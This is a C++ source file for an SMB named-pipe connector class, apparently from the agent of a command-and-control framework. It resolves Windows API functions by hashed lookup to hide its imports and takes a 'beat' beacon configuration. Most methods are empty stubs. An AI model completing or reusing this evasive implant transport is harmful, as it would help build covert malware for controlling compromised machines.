#include "ConnectorSMB.h"
#include "ApiLoader.h"
#include "ApiDefines.h"
#include "ProcLoader.h"

ConnectorSMB::ConnectorSMB()
{
	this->functions = (SMBFUNC*) ApiWin->LocalAlloc(LPTR, sizeof(SMBFUNC));

	this->functions->LocalAlloc   = ApiWin->LocalAlloc;
	this->functions->LocalReAlloc = ApiWin->LocalReAlloc;
	this->functions->LocalFree    = ApiWin->LocalFree;
	this->functions->LoadLibraryA = ApiWin->LoadLibraryA;
	this->functions->GetLastError = ApiWin->GetLastError;
	this->functions->ReadFile     = ApiWin->ReadFile;
	this->functions->WriteFile    = ApiWin->WriteFile;

	this->functions->NtClose = ApiNt->NtClose;

	this->functions->CreateNamedPipeA    = ApiWin->CreateNamedPipeA;
	this->functions->DisconnectNamedPipe = ApiWin->DisconnectNamedPipe;
	this->functions->PeekNamedPipe       = ApiWin->PeekNamedPipe;
	this->functions->ConnectNamedPipe    = (decltype(ConnectNamedPipe)*) GetSymbolAddress(SysModules->Kernel32, HASH_FUNC_CONNECTNAMEDPIPE);
	this->functions->FlushFileBuffers    = (decltype(FlushFileBuffers)*) GetSymbolAddress(SysModules->Kernel32, HASH_FUNC_FLUSHFILEBUFFERS);

	this->functions->AllocateAndInitializeSid     = (decltype(AllocateAndInitializeSid)*)     GetSymbolAddress(SysModules->Advapi32, HASH_FUNC_ALLOCATEANDINITIALIZESID);
	this->functions->InitializeSecurityDescriptor = (decltype(InitializeSecurityDescriptor)*) GetSymbolAddress(SysModules->Advapi32, HASH_FUNC_INITIALIZESECURITYDESCRIPTOR);
	this->functions->FreeSid                      = (decltype(FreeSid)*)                      GetSymbolAddress(SysModules->Advapi32, HASH_FUNC_FREESID);
	this->functions->SetEntriesInAclA             = (decltype(SetEntriesInAclA)*)             GetSymbolAddress(SysModules->Advapi32, HASH_FUNC_SETENTRIESINACLA);
	this->functions->SetSecurityDescriptorDacl    = (decltype(SetSecurityDescriptorDacl)*)    GetSymbolAddress(SysModules->Advapi32, HASH_FUNC_SETSECURITYDESCRIPTORDACL);
}

BOOL ConnectorSMB::SetConfig(ProfileSMB profile, BYTE* beat, ULONG beatSize)
{
    return TRUE;
}

void ConnectorSMB::SendData(BYTE* data, ULONG data_size)
{

}

BYTE* ConnectorSMB::RecvData()
{
    return this->recvData;
}

DWORD ConnectorSMB::RecvSize()
{
	return this->recvSize;
}

void ConnectorSMB::RecvClear()
{

}

void ConnectorSMB::Listen()
{

}

void ConnectorSMB::Disconnect()
{

}

void ConnectorSMB::CloseConnector()
{

}